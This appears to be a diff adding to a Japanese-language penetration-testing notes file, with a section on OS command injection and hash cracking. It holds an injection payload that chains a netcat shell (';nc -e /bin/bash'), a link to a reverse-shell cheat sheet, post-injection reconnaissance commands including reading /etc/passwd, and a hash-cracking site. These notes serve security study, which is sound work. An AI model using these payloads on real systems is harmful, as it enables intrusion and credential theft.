@@ -283,3 +283,35 @@ sudo nmap -Pn --script=ftp-anon.nse <TARGET IP> -p 21
 ### Burpテクニック
 
 - `Ctrl+U`: Intercept中に範囲選択した文字をURLエンコードする
+
+## OWASP
+
+### OSコマンドインジェクション
+
+- [チートシート](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+```bash
+;nc -e /bin/bash
+```
+
+#### 試したいコマンド
+
+- Linux
+  - whoami
+  - id
+  - ifconfig/ip addr
+  - uname -a
+  - ps -ef
+  - その他コマンド
+    - cat /etc/passwd: ユーザリスト
+- Windows
+  - whoami
+  - ver
+  - ipconfig
+  - tasklist
+  - netstat -an
+
+### ハッシュクラック
+
+- オンラインツール
+  - <https://crackstation.net/>
